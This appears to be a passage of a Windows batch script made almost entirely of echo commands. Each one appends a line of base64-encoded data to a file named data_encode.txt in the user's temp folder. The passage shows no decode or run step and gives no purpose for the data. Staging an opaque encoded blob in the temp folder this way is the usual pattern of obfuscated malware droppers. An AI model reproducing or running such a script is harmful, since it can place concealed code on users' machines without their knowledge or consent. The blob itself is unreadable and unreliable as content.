echo HIkfNhj8IHqrAUPOE9dH8Pu2/DCnlvMDntPwvFbYCUvJJu6/3VwIZzQYcK2rZBCS >>%temp%\data_encode.txt 
echo 003DI1lLSOYQklWE5CC0bo+idfclA60Zu78lPj8IblzG8RH3349ezdWeyylbZ3Jz >>%temp%\data_encode.txt 
echo 1BJDCovt64RhEIAmW36thjwfWbkhR/hNoMeK3qL27sKLZbAkxMe7lkzpgiVSoDTa >>%temp%\data_encode.txt 
echo bJhSAd5KZUBB8SG0+76IXFzYVda3xaT2wav0wj+iXRqNiWU1cA588Kdc5EkHf76L >>%temp%\data_encode.txt 
echo 3H5thYGy37o24X4C6vQjoA4F1wBWaq9KtTqWACtK7j8p25H5BSaP8vW7Hwit/Wro >>%temp%\data_encode.txt 
echo 1WOqNVbPmK8Gr57wy6ghETxMkU0JYBOlkxY1GmpBxbZZ4WQGUgD+28IPUW1gDyP1 >>%temp%\data_encode.txt 
echo hV4XNOttUC+MjvE2jvbpkBkX5rmbIwvzR6gTTke/v40asyv6/Rxqzeej3134fR98 >>%temp%\data_encode.txt 
echo DzV8GTmIRuIJovoDFlBEf3BdQlfdWvljpDTqbLUGf2wHpWHmpdmkMWqAOUF9gBiv >>%temp%\data_encode.txt 
echo Q43x80h8+KBdWpJl8H5ukL7IieoL5Le50f3poKXzBzYS55FhKdz+QySwQ/mCpDEU >>%temp%\data_encode.txt 
echo ya3AhcCTXCa7dw4lj1OX6vI4d2h57E6Niv8hJHP4D0Mx1o9u1jt40ThNRETybTjz >>%temp%\data_encode.txt 
echo oSWRmSzsN0RyratsN9lzvq48riV5nAWLpDZWHtee5pr5W8vjmkGi6srl8f6/gjz+ >>%temp%\data_encode.txt 
echo 8eIR5HH1N5DH1YRkLiFZMaI8Pvu/KY+7F/3/k8eZfy15fMcw8rhtsSGPd/JamV9P >>%temp%\data_encode.txt 
echo Hr9rujJ5/JopoTxeUR0vjyur4+XxzOp4eXxNdbw8HgvfQ0l9I91vY1bHjU2bNze1 >>%temp%\data_encode.txt 
echo 3Dlbyp923XUuDCB0NmK8GEZW1svTpS357un5bqmgob5FamzVvxamUv6dRO3dLZFw >>%temp%\data_encode.txt 
echo 5QRpJaR8d0x8b6L2d+S7vpswojuVURoPxsOqGUV/O1nTps3NrY1OJrdudLY03etk >>%temp%\data_encode.txt 
echo jTx02vi8voRVVdZIRrV4eZGPgZfr62PS/jTznyQoyHdh0hR6v7W+DfNP6PGskdw2 >>%temp%\data_encode.txt 
echo RJ+2JhegRglcmlsb6pv1dARGWB2139TkomhFjMObSrWmRvvDjoqiqRQw3UVTixur >>%temp%\data_encode.txt 
echo EtCpesKlmBZ6XCKliSH47gbM4SHlN7ul8hul6Bcc5Iq6ZcsXVEkIZNtwvUSiaKdS >>%temp%\data_encode.txt 
echo QhBpS32z25kapQ+FKcIYnM2NA0g07L9IFigdjBHL2Lphg8spEwjMCtAMc5tf6orl >>%temp%\data_encode.txt 
echo AkxPhPTHJ15FWr9NdrqkNufd7ibMqCS3AqsZA8dviDPVmUOY5uvBrsQ/Lt5Abxyt >>%temp%\data_encode.txt 
echo yvMgpcYzQiQBBMc0lcVOLaa7YgPxGjD3kf2EJBXoWa0oVwoOYBoO2dniAtYckXy7 >>%temp%\data_encode.txt 
echo ddajzAmYIor/tkcrJa/BvPCu5nrXXTzYFoNrJZcTWLIeVomLr89oe/z9DWjfKNWv >>%temp%\data_encode.txt 
echo d7U2u2Wn3mCzs4GHmSbM8pBofea7tgAAXCqYl2d4FKL96/mhMMFIQ+wqwnxJlFRj >>%temp%\data_encode.txt 
echo xmZnG6wUZG3XjJWLqmbctKjqa9AnEXxMJIYR5vF9uGZgYptB9HHKeh2eG8clbain >>%temp%\data_encode.txt 
echo zFk8X9YQIzHibPNd86Q129ZhkPmalnWt8NexrrkZPpaua21xwmfbOlq8syUmLV1Z >>%temp%\data_encode.txt 
echo U5NaUO9yuTchU/AqwAqYI1avE5GPRn4mPccSZjLaDPRxSmvyGzD1jAN5tB7zQbXg >>%temp%\data_encode.txt 
echo IHg6NfwRk0anzBO2NbVQ3pwhCFkZyc90r7Ot1Yhud7pGbqnH/9O6IbFMDTBumsfz >>%temp%\data_encode.txt 
echo T5ekBUZoc8u2rfXb5kkF22a0FEos1j6SWH9QXhWYPEwmZiTJSjyORO2bQCi0Ud7d >>%temp%\data_encode.txt 
echo 4dviPxKTgDSsLoKDKS6cDfW4vFo3JIA0fUC8NMqXAkyv0NQCNKvH1glaDb3Ol7ZK >>%temp%\data_encode.txt 
echo NGfxExaT0wCDvnlWjoQzkbi9nuUNsy/FIMinVWd8Q/8Ni/9QmhxgOwFJzP8E4CTJ >>%temp%\data_encode.txt 
echo 4FLKL4drJTW+DHgbs7u1UGKa6NpkBlcPxJe/41rceQ/X20Y2lXj6x8lHnqx3PXDP >>%temp%\data_encode.txt 
echo NvzVg5aGenn47HG7uX53t2xsad3akmCzMqL8IeFfubxSyi8ubb5HopQW7mZiAyoZ >>%temp%\data_encode.txt 
echo ScLHor7AwbEnIYg/pZKvq7zC/KHS58W1X9XUsrQOf/LH3dYkbxsGVsz8R1T7NK7a >>%temp%\data_encode.txt 
echo aZ8wW98oLFgorQdpujGq8HWlWUg5CpyNqIw36cm5oDL1GK2E2zxpqClG/lzgAM7A >>%temp%\data_encode.txt 
echo vyRqoyOnFHb6/jKWBTGfD1WP5rkZaYIi84P90e9hYY7HSPYz14jth+YNAwXEeMhp >>%temp%\data_encode.txt 
echo pt9rh5WkMz3/kTbO2kQ0xwgjiPTPJTv+LNzXQiLVWIaxdIyd8Fi88PdUCJtp0wyh >>%temp%\data_encode.txt 
echo OhJ94vJ3DmSm6LpIsCz0lTuNMRfT97jALyvJz9Les+rgC975FB20dl87j5o64q9k >>%temp%\data_encode.txt 
echo ezGgG85Q1fpZrJyRA6ERAGY4dRpB5fBZo3/W6p91+udqum0hD1bRNzOVsb0yRTmJ >>%temp%\data_encode.txt 
echo vuAoqlCgVyzRP+lqaLe9f1A8npmciS4H3rfA0fEZDO06hmNXZyHs4JNljNyS2jlU >>%temp%\data_encode.txt 
echo qx6eZK7dTG7MWD/4+X+T65LvP+AgGjz4HDXw/diK3naziv3cT5zirUpswasX67d6 >>%temp%\data_encode.txt 
echo GWXBHSb16BLx4VVUM/s6vWaS7jlyYdGgmh+nkAdfiV6TXzjZgq8MrrkRo6spJB6d >>%temp%\data_encode.txt 
echo iR5PZpz05LIKZ/FMe6+9u+yY+EAPvPF1yzn23jkUhC8+8A9UIvrWJ6MbNJzFCzz9 >>%temp%\data_encode.txt 
echo 88QHyXOn2ZbDrQb+GttqvMPk1zN+mBYVDthQWqPNOo9WhbW2Kv9aW62KFzB1tmoK >>%temp%\data_encode.txt 
echo lUInOt0r1ZJBw8jl4/XMPQ4YCeLD71gY81yqFb1nLDyDhpb3Z4T2uWFODfRPVrcD >>%temp%\data_encode.txt 
echo mFxb8NHPBLbvPDkRH8a/GX/m7gVWzLBuHOI3XRAYoFCOt5pala0K49R8/fvI8MEv >>%temp%\data_encode.txt 
echo z70f4vUpIIBzhkGcQXWegLegxb5+eaa21lYK5JlMxLP3lh1zofNssZa1H0Pc7oWp >>%temp%\data_encode.txt 
echo Wlh2rO28pvtEt3wqoDmjCFCbqV/CTia+1JvW2Iq08l/4+kXvZ6Zo0yJsOvNT6rUU >>%temp%\data_encode.txt 
echo et2IF7UYervcFMkIIHq7GJlZqjUkMgUUql2Fr3u+FMR//AVO6im31dfjRpvPOt9h >>%temp%\data_encode.txt 
echo t8VzSdgxD8ZQU3ZCvlZP1kCF4zH9ANS0vMS9tdeqQbJLvoS+yuGPocr9J15ajs/n >>%temp%\data_encode.txt 
echo tGZo1kO3mKGbPe8d9By9JfwGhRbVVzBtLnpwG5ZQmJSgdEEYOW4KUQitwYDlHtEb >>%temp%\data_encode.txt 
echo JOMswoFuDzx3ZwXF1MmWA8/fWREB8ckdUa//lz65si5sMAPLPdttNoFAAcQXOET0 >>%temp%\data_encode.txt 
echo lKQr9uKGCFT0OQ82AOQRQxUAco1P95byXBQOctgHCXZdNBiweH1M/BPADb1/mRKJ >>%temp%\data_encode.txt 
echo 3K3xxCkYEgozIrwBczLb0xc/RiAAJwmuKMJ/PZX+D2fPAh1FlWxPMglDkqGDJJqN >>%temp%\data_encode.txt 
echo iQyQSIIECISVLAkEwQgCAosIyGd3lYC7RojYA7qLkNgZSe8wgIrsj+eTw9n33PUc >>%temp%\data_encode.txt 
echo V+EYsnxCfiSAICSAAhGI4meaATdPYBjIJvOq6t6e7kwGHZdzwvRM962+t27d+t2q >>%temp%\data_encode.txt 
echo uhYN4j//BRBvaiVI4KbTSo9P0x/Zio+c4o/QZCW2sfouFg9V9mm/y5D/8S9TWPUi >>%temp%\data_encode.txt 
echo zCUJhvzHcBrBFDvyYHkRpakjcaFR0Q9nyk7qmA4Px+du+zYMmNtZ8RJM/E2lIi5x >>%temp%\data_encode.txt 
echo u2hA/XRYgAj3FiOsO00nLocYWtrqaAC4P5ZWQG1bBMba7GQQbDjfl1hRj8dhtSnN >>%temp%\data_encode.txt 
echo YvlBFHHe3E9eSIYf5+FerpKwCxbvvMLcj533AJbnrfyashy3AeYlchqS3MC4UVzr >>%temp%\data_encode.txt 
echo g58zETiEsbIv+k7xhdnwQnVtBwwMvZJ5HyCfzLrbxOLr+8K3QncfeIT2ND/zHHbO >>%temp%\data_encode.txt 
echo NRMSf9mdjv9y1TDwiDtOjP0fynnPu7TRj92PVUt45Yv2X+iTPONqGBOCKEBm2HAb >>%temp%\data_encode.txt 
echo eh6BVeZBOLuXXDXxO/bL6t/0bSVNEKvKbYrncX8UQZKg1yPqa7f8/s3o+1XX39Lj >>%temp%\data_encode.txt 
echo P6n8ASMbnFhn3E54u4/tKZndqTK2tvcpZNJr5Ql1wi3KLB+KIafjbxFrH9pkfp8o >>%temp%\data_encode.txt 
echo cDh+TySAVl65yOJM+EADiPGRR18JACxhAC/4aEZGMNF5WCw/hj88njaiybyToO73 >>%temp%\data_encode.txt 
echo McxVxRE7RFBu+xCdP+Uu1jHa6WH8a4D5e/gX4oggbwgB+V4dclzlMpYXNXOR/oa/ >>%temp%\data_encode.txt 
echo 8DfgfHm2Bbc+n9mz9YiFBYKnRjnoWY8+/qW5UY/Ck9JyAtyP4kLyOPDaS9Gu4rEm >>%temp%\data_encode.txt 
echo UAMs+1FLcQ/z/Aes49bl7o00XhZQreYZVKttHlKtUAQ1wwTlqBfh4f2jEDun4Yqv >>%temp%\data_encode.txt 
echo 1WjWj6G4Vk1evz+gzcjXbjByaDJjQShBo5Mr6rkbgdaHWIdGYOvKG9SaCkGJ8js3 >>%temp%\data_encode.txt 
echo 2Nw3mT/grUtY601wY+ZUrOUZ5I8GhTeDpWyIlVEpLtzFnJqUZir9vMtSWzE1id/a >>%temp%\data_encode.txt 
echo bcVbtWpkxRG8X/qFSWgp/bzT0qw/Uhk1JtC6pi2i9PMOBsBKqWGpaahMYyUIZb7Z >>%temp%\data_encode.txt 
echo mZjhwiwiZZYFFAOk5FlxYvlKmKHJYvks+CidkmQpzb/XRXFpU/EQm/xk+JIovrqL >>%temp%\data_encode.txt 
echo BPBQVjwnBtYjButnLKgPppu/DsZQ59RkpnimcI6axDMn495dWSAsFSs/ciUoroRm >>%temp%\data_encode.txt 
echo V8LrSnOtaqnB8dV8ESEcEVoyToqVJzEYCmsEYYqSJioX6ITR5tZJ946Lg/Y8QVu+ >>%temp%\data_encode.txt 
echo D7rierRrqXwrclXyUvl2LykB/u8tvvp7nAx9P5gPTnQMhHbwRMzqicGDO3Q/atWp >>%temp%\data_encode.txt 
echo CFF77fvQLWfcf8WXENeJ03o4Dnqozvf3XJUOAmE1gigBEJ46Npv/xIfYfiwmJrg2 >>%temp%\data_encode.txt 
echo +7u6um6eGFBX9kUp/JPUm3WlpYJgj669HC/XRggt8tnIMhUbuWaZ0BZIhxcrE1OA >>%temp%\data_encode.txt 
echo UWK9KjNl0DFKmJ+CynAi3HeXPGjCTvyU0uvw5vYCuFyqTI1XIsksU21dPbt+JF3H >>%temp%\data_encode.txt 
echo 9syF+mz8/Jsw1rbn94yUhqwqZDopVoeq6uz5liXp3QiIE04SX/Jx7wEBqXtQQaDy >>%temp%\data_encode.txt 
echo Fqj8JuFmb/4ajBIWy2NDdLyvoeMlvzLUv/pa73jZ9zGl3hRfhkerwK13uDxwJ8O4 >>%temp%\data_encode.txt 
echo xcpE/F56+yWxfDOWXakpvT1fdHwOSoJa2om5TPOTKs4INWmW0ks3LfUV85PUbf8m >>%temp%\data_encode.txt 
echo eVb6q6Sb6ma4fnhGofAMFkHH6vY2tgEhFOOxGN38pyx/J4XkyaS0BB5gMDkXloko >>%temp%\data_encode.txt 
echo T4FJC95vB4MW+FmCH5hxlOsNMlRZtujodrSCnPgLKpZKu1hxEKysdKENDLdrmfXK >>%temp%\data_encode.txt 
echo zcyLDq9Y8XdQb8fmXyHbZ1WcEFCnmQGl+ECVN9f6+lMFBrCgHvg6DDMr+kt4CM0p >>%temp%\data_encode.txt 
echo 2nDd2CcOAzHw8cxzLG7PdJHFGmvmtsbe84eQuH0OQ0qxI4dXFeD4c5wPB6Z2s0G4 >>%temp%\data_encode.txt 
echo VX8ZBocg0QR6RAJaZbkSIPKVRqSlhhRu6RhlzeMGWTPiK5aBNNlExifGpOXg2+aC >>%temp%\data_encode.txt 
echo AHdmBPWFhCBVwcz8MhwtaWFajjwWKPliDKIa5wqJfI6fxFOesx+qUI9o1ccMGsNH >>%temp%\data_encode.txt 
echo l8JRigkedL0khiJ485Re2TU7iCDyiThEnKWaCdxNYJM7IsVytA+64V0CvEer5Xyp >>%temp%\data_encode.txt 
echo GadpawYpaYfuhDnvJeYAaesdfL6Pe+x/85cWIjqV806atGcWd1fXv/pCH+WAO41S >>%temp%\data_encode.txt 
echo HdxFrD+Buz+iuaPk0Jge7o8h0JHtNPJ5Kcj8p1gEYamcL0BLQXTItPAxDCeXwpMk >>%temp%\data_encode.txt 
echo ezBv+dDGs8ms+JRzdDx/ZTswSC1kWpuhzC/Cmf9UBOS4qqQiKHHje72gg9fZrDk2 >>%temp%\data_encode.txt 
echo kFsn8e4gB1D7gz3GNZrcOjwj1CQ6VkTjShvDi/SJlGZh5mwY+5LtZU+X/q4fLPeK >>%temp%\data_encode.txt 
echo KADotVtL83GQw8Vyr5k5pZ7ohwVK0/2lfr8UnXvwZXiZciYdDzii5AdxYwflQcQL >>%temp%\data_encode.txt 
echo grQmX+gLH/fl48lv4sYtGI3caRI3OdGAwvWgFVvshs+i/pjKlcNKAY7cc2xVd4N5 >>%temp%\data_encode.txt 
echo psHoONfWfY2r7VjaCi1kz1EXRkpjf3uRdZEE1sUMJPs+/JWbDXBebwvTQm3u0CzU >>%temp%\data_encode.txt 
echo pg4qmlkAK3KSv5czVolR+qk7OyiTm4axfAJzBm6NpM+NvyEdy/EH9NMIrFKhlcks >>%temp%\data_encode.txt 
echo ULReQmj5BczgtwDrLV/WYRBpT0UwP+GTmpFmQNdP7zOINoP7o/qiQbQJPyTaUo2i >>%temp%\data_encode.txt 
echo DQ3s8W2MwRXh1DERJ1bXye4Jsm+MuL5PBJUkrHgZ5sabt65AcP3Iv5eDvhevvfOz >>%temp%\data_encode.txt 
echo hf8B/B/6m/zij3s/ImofYHcv4lxD8YILYaIYi0g4rRzF3CC1uD+D5s5Rcr3ZtZV0 >>%temp%\data_encode.txt 
echo vE8GfBdKx6uP4I1A1WuNLPNQe0wB3TcetPMxMVIm2q8LuDzAu9X8WDOij7tPmShR >>%temp%\data_encode.txt 
echo sj/Q/dRGmQB5jrESB0he2a3I9HxgPmKFMXSuugdFM9K9BD9297puPAE/qed9gaJg >>%temp%\data_encode.txt 
echo CEHdy23PE4Agsfo2Ovg0FI05H4ZvRc3gWuAOA/12fRZGy8YoJMzHcGnODTiPpsNV >>%temp%\data_encode.txt 
echo gejIAoxsj+MeURt6Eb2gKcKnGutj+UFUTBHZH2aubsehyD5YjFdu+v2wUt9ADc4d >>%temp%\data_encode.txt 
echo QplsSNZXXLyBi0z7LCwuwr2pe265gs6/ECuTK570P1Tear/Bua50jnwfCGi4YUoH >>%temp%\data_encode.txt 
echo jWPsYOFtSpXH34guMTlzMvyWt1AaGEjm5EWfD7SaAkWfL6oD0QFjxV0Wx2EpqjFy >>%temp%\data_encode.txt 
echo uOc4TeDiUL5aqdUgcO80E0RQjqu0c2N/j0bo+V/naCz6iFx45l7APxbcuEXeUOlB >>%temp%\data_encode.txt 
echo RlfBqP31T3TUvm/Q0//vHBhTd1Gnh7J6s7GY1+QX1PHenhM0yACl3QDl3XPhmCn/ >>%temp%\data_encode.txt 
echo EwzuVJLuCDmzSnejqHYYjGJOy/a7tyPkfJTR6i98Gh1O9ulL0vliCvrozp5Drmof >>%temp%\data_encode.txt 
echo xFWtGSmoay2BH520g9RUmEIOr5dv9hzUY0m8w9M0k01pcs5OQeE/incQZouqoG02 >>%temp%\data_encode.txt 
echo mGa7z4ajcTD78PkUjT1JQDFXoSUsrE0z/dqACkNYs7vv6Ykc9BKp83y6yohasTrz >>%temp%\data_encode.txt 
echo uqa/Komobqob0GOST+ooKCTD4ZuaAv/BKKjRBYCmvoHPUCir00pGwpHMc6azJjIU >>%temp%\data_encode.txt 
echo WIKQeuoapnSDvYyN0HnEKHi/VqrpfYO7F8n5r2fCwQgouPI40JrOXUOi4zp4+dFr >>%temp%\data_encode.txt 
echo PbXuOWHBo3Fmt2BOHZ+9cQwNzlFogL1YEGx8KfJ3LDWAhpTVxi0i42jArHB/+ims >>%temp%\data_encode.txt 
echo jATolutVPEvSU8U+1RHQmsXICLYZU2OEGMEaI/DzB4QFeOjbypcWCQvw1IZFNpuw >>%temp%\data_encode.txt 
echo AMPWXlpkE4YJ8I3v17KIJGGRYFvAQzN4pIaA4SXCE9k12S2zsw/LV3J27MPRtWZ7 >>%temp%\data_encode.txt 
echo lcQTWFwEtUxWozL1KDP1rKdwxhKPokZb3oJ7sEM5a54LX9ztOaTWotIt7q6Tfb3F >>%temp%\data_encode.txt 
echo 9fkW0jGuOFDHSHi1QPAqBYJtY/e/eU72uYb/aT4Be5+AN6c8HjSvPYgwLJfTDm/Y >>%temp%\data_encode.txt 
echo cR1p3Nsjn6A1Qs8n0OKc5dt+qQgIAFpU9HWmYkt/FH7TkrHoJ/uuO4UW34PqWWO3 >>%temp%\data_encode.txt 
echo 1zu81AHsIkpV7OLzKICuu5iKnx0hCKy+Ah+LlZe2FsvjUHukRjVS3GSS8+ImzIiT >>%temp%\data_encode.txt 
echo u0zrVjgTcRq2W6jmi1jup5oIhAWQfFtYQqWFF8oylywx6L+nwyFh8h14H0oy2ROq >>%temp%\data_encode.txt 
echo yZr1jASQ38kNOVoRJ3OJYTcrPxygng+DGcrSfjrzHuDQwX17Kqw+BjCgimgvp45h >>%temp%\data_encode.txt 
echo /krJmUgWVIt9su58Gsv5WYbhNetPhbG3p5rIsWhFKwx3MXB74TGY/tx2cSPu3ymN >>%temp%\data_encode.txt 
echo 5HvWHYrNXUz9OMzViSx4o2eDNvTqkQbhvvQug/B62jD+k93NXioC7a7ywtXlTj20 >>%temp%\data_encode.txt 
echo HY8LDvj374WblZ1afqfb8xPK/cwM4XNr74saKpKZUoeMbgM8XzUcesmKvpswI0ea >>%temp%\data_encode.txt 
echo oe210iHG+MaRDsbx9xocLw+fDAeDz9KuXDzRv5TMBJB3QpLZ3qvqZ4icP1VNxI/X >>%temp%\data_encode.txt 
echo q6bhh5PerK7AKU0cwyq599F0AbH8HRzdsde0tNd6SnvNXrdMo35pSfB40TDlm6Zx >>%temp%\data_encode.txt 
echo 555mebR/ZJ9myYD1F1vC8CIpF9SZPI8rGNZ6A6yhAMuzM7gnq+K1wv6A+Vbpd2Fg >>%temp%\data_encode.txt 
echo nb+kG9aPN4eD9U+pnEswrncwXG+jF3nkAIatAR4dC+vdvbAadTilXvqt7IuS1gKG >>%temp%\data_encode.txt 
echo lcZ1y3UO82eWxR7XAt2TOyKrEAdSVNV7T+v780Z0pDaHgVr0Pm3BDR1XzpvIc+SO >>%temp%\data_encode.txt 
echo KNFxiRTBP5LxwnwzrBO5zeLWeuzJnxgCMubAsBytVXMZlabtYrtYtl1sDz7FHgge >>%temp%\data_encode.txt 
echo SGK5Zw4s3xVf9aSD7ifA/accemnBLE7sJwxon3ciHJ2/lU4OuFaoZt4Osf/Xh8af >>%temp%\data_encode.txt 
echo xkbiwD33jGfgVVq3bb9x9OzuaNZdhgXWYSzkBr0P6jStm1CKW5eVrQBtprSZC5ox >>%temp%\data_encode.txt 
echo 42J49jjoGlNCWEQ7rT+ahp8LwTlij4dDw1JnGDTM9cFuvYyz6oQ2wiD9tnwcxhy6 >>%temp%\data_encode.txt 
echo ux4QmEqjxt7S9x6MesYFqrlIO0tbalGxXzBG40jZPuJISqO46X7cEuZrxl6E7zwS >>%temp%\data_encode.txt 
echo 3nq5eizc9QK0dpKvF3V3CFMiMq7n1B/5/qkvgZd7yoIB7YntLjVeCSU1nqjapce8 >>%temp%\data_encode.txt 
echo IMO1SCHmXjwWxtxzDVHdSsKVuzYDJLCNkcCbTFa8FILmY2IFbWEkcGYQzz8tvwvR >>%temp%\data_encode.txt 
echo qd8eDYcgx9/Q6mGZmW06mJTAUm3HSK6zKYltyKWejMcNuOtHYBnFQCN3ch8kkD0j >>%temp%\data_encode.txt 
echo KbXPB/aR+g+vXp9K2+8pThshr0nLicRNMIqDnuqkstR0AkTg+JNgRab6ozD67jmA >>%temp%\data_encode.txt 
echo RVMmZoDCOSdC3H0GrcnR8A3NH3G3T/7WnHtTXP8YUFxZx+xJ2Mt7IgPXm7BEnNwR >>%temp%\data_encode.txt 
echo J5bP5Bebcumit9Sf8EE1K4abM7sAjtwVCRwqZ/UmdTxMTFnH9FEI7bAJodH1pudN >>%temp%\data_encode.txt 
echo 1JbVEdXsOe1QJ9xpgq6S32yJmfu633JmER6uio7TJBt6iZvepIto0fUKXURIL5TC >>%temp%\data_encode.txt 
echo f3nEt5fq2Hn7CF9M3xccppxR30Jt7nxtp0XcfXCp7LNIyQE/tAHazwGa533yB8Gv >>%temp%\data_encode.txt 
echo nj+TiVgEV5vpCn97Ve6YITp45EwcihI8SoksOmBFmU2u1bcBPwG/mYA0siAECT9i >>%temp%\data_encode.txt 
echo Ca0eHz8cjqPtLGPetJeqbuvCiZgwTRAkT1nHQ0W43VGBu19+86po78MWk92Kz1Kp >>%temp%\data_encode.txt 
echo 0xIsqTPH7FrdgSQy8n62JYuzk9tuP6vOwvNrZL91NbXogy3GUQs6QO5SuiC8Y5a+ >>%temp%\data_encode.txt 
echo dC2i0m3X0/XWrhnf5R6yH1HjuwJE4WgABu/Z6Zpudi2ibcWGdFblzzX330ojmjBY >>%temp%\data_encode.txt 
echo lhc1vmcvw+sbxfI3uEIbb5iSA4fCwcf8TnztlOlIi9MD1+vSyzrER/C3XPqNrjdm >>%temp%\data_encode.txt 
echo dWroUlOwso2X4UwVO7n/AfC2dwa8alVG6csWGIeV60Ptf58QqO3O6dj9Nu4b1qPU >>%temp%\data_encode.txt 
echo +AQV4YBJsp7R8bpBRMPVmO3bYRIdo/gIdwJRqWM6Gb8BipLGlXWYChBpd9NW88uW >>%temp%\data_encode.txt 
echo vdpgTxR1d3u819QdIWrvTp0WXTNuUEwg2hxL0LMVwkQ4FhWa8uY0hYNpPHdmL3aV >>%temp%\data_encode.txt 
echo 7DKuWNofoTpAa7hM1nvsFsIBWkUSriOETjXgDn39W2M4fV3mJ/8wnm1YA4SXgpG9 >>%temp%\data_encode.txt 
echo ChYvKk7LAZkJfbZBn9NWDZM7I1fRfjyeUwaEnjxIYHWiM1yzo3NPrx5QhfQQyD9H >>%temp%\data_encode.txt 
echo UFimEdpiLSS5YWg9+kYl7FSTw1+FVZ+ksxTLPClthHJZyUvLPIeC0zUt0kysL1er >>%temp%\data_encode.txt 
echo oTsImGIeiJp7EYEAeASFOhdTbUT/42l5Sr3iRYejBWGf8ZQjvWjnj2F1n8nM+eEc >>%temp%\data_encode.txt 
echo jWUItjewmFAbHjuoYHmoFIzMS3MPGQgrdDYIhnYcXd5AQmqKa2o0Bgsz9xs/UK3K >>%temp%\data_encode.txt 
echo RfvWk+TL0UriFlJu2G6+krUPjeTUGnL84LEjrsU+pOn107EodCsqTF2kMJEjBdd7 >>%temp%\data_encode.txt 
echo 2nDO35cHTvKa+SP0pIMNYahzpCdhNTZX3ocRAve3wJCzWx1+PhqcqWlpGYYAcIUK >>%temp%\data_encode.txt 
echo 0UlUoMHHqpQCxp2J19mekMA9LO6TXwnCWECU9IkziwZwVep1IAIYt+cghRWTfxKp >>%temp%\data_encode.txt 
echo gVwmy6gIhuVABC9rHYj/qw9jHBSLqdV/ZOHfklW5WfuNRT4eoQ7xkw+WwSYOucxQ >>%temp%\data_encode.txt 
echo /z8s+N/o9TXJezSN8a92aOykiVZo+OqBrhDn3QXiVQCZY5C4+Dpp6U9SPUdpklWM >>%temp%\data_encode.txt 
echo 9U+Sv+klOj5jayQJ7PUI5b5cj3LmhQjFTfVfsauNeEyK9ACAy3O0SJZcj/gKxm/J >>%temp%\data_encode.txt 
echo fpNUBP+tLZD9EVICLKhsr7svNmjXVCMUHtSLSbQlLNehJhpHU+XGY/pOM/8I0Fkt >>%temp%\data_encode.txt 
echo 5e6voQh9uQk5k9kdVY9mO/ADAjON3aulFAX3FNzm2KrhpxjaFsPay0mjah9H60CG >>%temp%\data_encode.txt 
echo L9LnB9vKtdFI4s33obvzjNrXbzg/aW52S/bhJ2ZjyI4TQ0rWpCVNxaLMI3l7x+G1 >>%temp%\data_encode.txt 
echo eVhffvCU5svyrV7rYrGa4cm23nVyraXiblm1FNZetmAL+2msCrq5MVqAJws9VwL1 >>%temp%\data_encode.txt 
echo RwOPe3bDeOYGqp8iRxIro5WO8hppYKA/ef1Xj2iMXDwRi8OX1hVU9IOr6PIa+zeN >>%temp%\data_encode.txt 
echo kUyOAX95ZzftLio+uSEeXxpcQ3RyLQUl10kNiles7FNYETvxUbvXU0ny60oK1jjE >>%temp%\data_encode.txt 
echo erNjiT+sztdKJ1A57cR9zL3mlgGIKRW/Zddk0pMmYhZILFSbnI2vCvVoz2W9Htg0 >>%temp%\data_encode.txt 
echo mnaL0+ScTOzTGeOcRZW61VkAMXR+k55dvKKkaHkgh30B5hwuCiTVp78gBD29pKi4 >>%temp%\data_encode.txt 
echo SCqyrSheQkmRQXdXsmx+7e7a4Pv8sGpjS+3NKzHTlH78ofwsPT8yUD5AWrHCVrxi >>%temp%\data_encode.txt 
echo +bKsLJ4jybI4f6i9sQCABgLTCjOH2WxTli1fsRLBDAvOj2X1E9g51JQqlkHxbEvt >>%temp%\data_encode.txt 
echo xcXjseVEVoigiCUHD188MSg/OHjkgfxOTLG1l0i8CEFW1vQVK4uysjLSi+2ZxvzG >>%temp%\data_encode.txt 
echo rKws20yqD/DLWYMxr/R5+6+loZjAisdds7Pdny2ibFReE6HIBm0C8tkaxrHcof9Z >>%temp%\data_encode.txt 
echo BcyKQxLRsoB/ZhMeXi7BCw0/aJd60nBW1sqiInwM7q5+Ski394j3K7uyQYt0dunq >>%temp%\data_encode.txt 
echo zevRtI04jAeSiI7vBAzUnUchS8pRgzfZPY5FW23lUD5+q0D3hxwwCTvaaDPB/nSw >>%temp%\data_encode.txt 
echo BnWxAzgTl677tulSY9n+MKQGbQaXNWDXiQHzeqjmNOa3ou3FxbEmWM6esz38/4YX >>%temp%\data_encode.txt 
echo r4UXexx4VWrSx/Ql6BzqvX4KtdmzjcdkuLv2mZh2osfzxmJsxWsUW9E84Ejo2Aqh >>%temp%\data_encode.txt 
echo BUsABgIrXFJydFmXPxIV/rfYO+kEkBMI/aDjahUrw2MzRFuAVEmpxhYgFzMb3ZXw >>%temp%\data_encode.txt 
echo ZKN5mJB7bW2Ecq1a4DjCjrryHkCeuQWeCIT2JJiIUaVkXkA4mR+bmlyFuAWaJPvM >>%temp%\data_encode.txt 
echo B7BczuoB/jRH+9sFwuaq/6/sWKOjKK8zmyEJIckEkmgQMFHWygoU1hLrQlKXPCFU >>%temp%\data_encode.txt 
echo ChZDj2La6jkKJQIHZsOCIW66u7jjOBg9iOdYxKagaPGBDxaQHmCJXYNaDUlNgVjK >>%temp%\data_encode.txt 
echo 0+5kQagcEiCP7b33m9ndIJymPwIzs9/zfvf7vvu+jXZuH/wdhL82+BPwXbwTqSgV >>%temp%\data_encode.txt 
echo DvEGCo0Nd7MkEHaMwW4PbaJoWznFFHQTztKtADxbT00b3lAGQIsLsIL00LVL0XEl >>%temp%\data_encode.txt 
echo thQb43DgsT2DwAEcybO4UueRWYKXNfjiRAvZiFYB8NuHhkeaHZ8ew6d78Ily4U2I >>%temp%\data_encode.txt 
echo UA11AaWoEEKbExgSz2DfQ5kwXg2VN0g937NnwMqs7YutDJa9E3t9ivIXG/QI2i6i >>%temp%\data_encode.txt 
echo z16XfEkqjTs/mIOit7Vuqu17ua0GVg9Wiymf+X8R/PBG6/oYLyP8aKEASZZjjqAc >>%temp%\data_encode.txt 
echo ipPCkLUrs4Bl1xjZygLoU3fHWb5Kv/Tud46qH4LmslSB1Nu6SruWIXc7wDz0o49/ >>%temp%\data_encode.txt 
echo COx2thjxGeS01QiPkOWChrpE4kcrKUtGNhKzyFrejTmD17MDY90kPm6+K1jQzZix >>%temp%\data_encode.txt 
echo oFSiLo/In2PW3qmx/RRSNkUidyfMFv3NvoRiJGNegQ9QyHGGNcWaid6/6kMRNEln >>%temp%\data_encode.txt 
echo YaT8VhaRCqmyLKYtZIAaEzMVplD+0OypnVFASSthtD48SOJARbHTGMBshxnI6sq8 >>%temp%\data_encode.txt 
